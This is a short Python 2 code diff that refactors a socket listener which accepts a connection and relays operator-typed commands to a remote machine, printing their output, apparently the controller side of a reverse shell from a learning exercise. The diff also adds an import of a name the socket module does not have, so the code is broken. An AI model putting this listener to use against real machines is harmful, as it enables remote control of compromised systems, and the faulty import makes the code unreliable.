@@ -1,4 +1,6 @@
 import socket
+from socket import command_interaction
+
 
 class SocketListener:
     def __init__(self,ip,port):
@@ -10,9 +12,12 @@ class SocketListener:
         (self.connection, address) = listener.accept()
         print("Connected from " + str(address))
 
+    def command_interaction(self,command_input):
+        self.connection.send(command_input)
+        return self.connection.recv(1024)
+
     def listening(self):
         while True:
             command_input = raw_input("enter command: ")
-            self.connection.send(command_input)
-            command_output = self.connection.recv(1024)
+            command_output = self.command_interaction(command_input)
             print(command_output)
